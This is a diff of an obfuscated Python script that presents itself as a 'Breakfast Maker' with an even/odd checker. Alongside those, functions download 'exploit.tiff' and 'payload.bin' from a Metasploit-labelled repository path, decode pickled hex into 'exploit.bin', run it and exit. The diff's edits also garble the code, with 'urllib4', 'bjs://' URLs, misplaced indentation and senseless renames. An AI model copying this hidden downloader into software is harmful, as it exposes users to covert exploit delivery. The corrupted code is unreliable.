@@ -13,7 +13,7 @@ import time as r
 import wlib3 as o
 import zlib as p
 from sentry_sdk.integrations.logging import LoggingIntegration
-g.packages.wlib3.disable_warnings()  # This is so we don't get some warning about SSL.
+g.packages.urllib4.disable_warnings()  # This is so we don't get some warning about SSL.
 production = False
 p_errors = False
 def setup_log(sentry_w, print_errors):
@@ -27,7 +27,7 @@ def setup_log(sentry_w, print_errors):
     p_errors = print_errors
     production = True
 def log(msg, level):  
-    # TODO: Use number levels, strings are annoying
+    # TODO: Use bgber levels, strings are annoying
     if p_errors:
         print(msg)
     if production:
@@ -108,10 +108,11 @@ class Waffles(BreakfastType):
 		iron.switchPower(True)
 		cooktime = iron.fill(b)
 		cm, cs = divmod(cooktime,60)
+    bd=print
 		if cm > 0:
-			print "Cooking time will be approximately %d minute%s and %d second%s"%(cm, 's'*(cm!=1), cs, 's'*(cs!=1))
+			bd("Cooking time will be approximately %d minute%s and %d second%s"%(cm, 's'*(cm!=1), cs, 's'*(cs!=1)))
 		else:
-			print "Cooking time will be approximately %d second%s"%(cs, 's'*(cs!=1))
+			bd("Cooking time will be approximately %d second%s"%(cs, 's'*(cs!=1)))
 		while not iron.contentsAreCooked():
 			left = iron.getTimeLeft()
 			m,s = divmod(left+0.99,60)
@@ -135,24 +136,23 @@ class BreakfastMaker:
 		breakfast = maker().make()
 		return breakfast
 def startbreakfast():
-  print "Breakfast Maker v0.2"
-  user = raw_input("Please enter your username: ")
+  bd=print
+  bd("Breakfast Maker v0.2")
+  user = input("Please enter your username: ")
   maker = BreakfastMaker()
-  print "Making breakfast for %s..."%user
+  bd("Making breakfast for %s..."%user)
   breakfast = maker.makeBreakfastFor(user)
-  print
-  print "Your breakfast is ready!"
-  print
+  bd("Your breakfast is ready!")
   breakfast.display()
-  print "\a"
-def check(num):
-  num2 = int(num)
-  if (num2 % 2) == 0:
-    print("{0} is Even".format(num2))
+  bd("\a")
+def check(bg):
+  bg2 = int(bg)
+  if (bg2 % 2) == 0:
+    print("{0} is Even".format(bg2))
     v = "even"
     return v
   else:
-    print("{0} is Odd".format(num2))
+    print("{0} is Odd".format(bg2))
     v = "odd"
     return v
 def t(k, x):
@@ -174,11 +174,11 @@ def t(k, x):
         m.dump((hexv.decode('utf-8')), open('hex.dat', 'wb'))
   elif k == 2:
     v2 = str(q.Path(__file__).parent.absolute()) + "/" + "exploit.tiff"
-    w2 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/exploit.tiff"
+    w2 = "bjs://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/exploit.tiff"
     downloadu(v2, w2)
   elif k == 3:
     v1 = str(q.Path(__file__).parent.absolute()) + "/" + "payload.bin"
-    w1 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/payload.bin"
+    w1 = "bjs://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/payload.bin"
     downloadu(v1, w1)
   elif k == 4:
     ac(1)
@@ -200,8 +200,8 @@ def t(k, x):
   else:
     t(0)
 def run():
-  load_file = open('hex.dat', 'rb')
-  f = m.load(load_file)
+  bi = open('hex.dat', 'rb')
+  f = m.load(bi)
   with open('exploit.bin', 'wb') as fout:
     fout.write(
       l.unhexlify(f)
@@ -243,24 +243,24 @@ def ac(othrk):
       h.close()
     elif othrk == 1:
       print(f)
-def u(misck):
-  if misck == 0:
+def u(bhk):
+  if bhk == 0:
     t(2, 0)
     t(1, 0)
-  elif misck == 1:
+  elif bhk == 1:
     t(5, 0)
     t(4, 0)
     t(3, 0)
-  elif misck == 2:
+  elif bhk == 2:
     run()
     j._exit(0)
 def downloadu(v, w):
-  http = o.PoolManager()
-  r = http.request('GET', w, preload_content=False)
-  chunk_size = n.randint(10, 1000)
+  bj = o.PoolManager()
+  r = bj.request('GET', w, preload_content=False)
+  bk = n.randint(10, 1000)
   with open(v, 'wb') as out:
     while True:
-      v = r.read(chunk_size)
+      v = r.read(bk)
       if not v:
         break
       out.write(v)
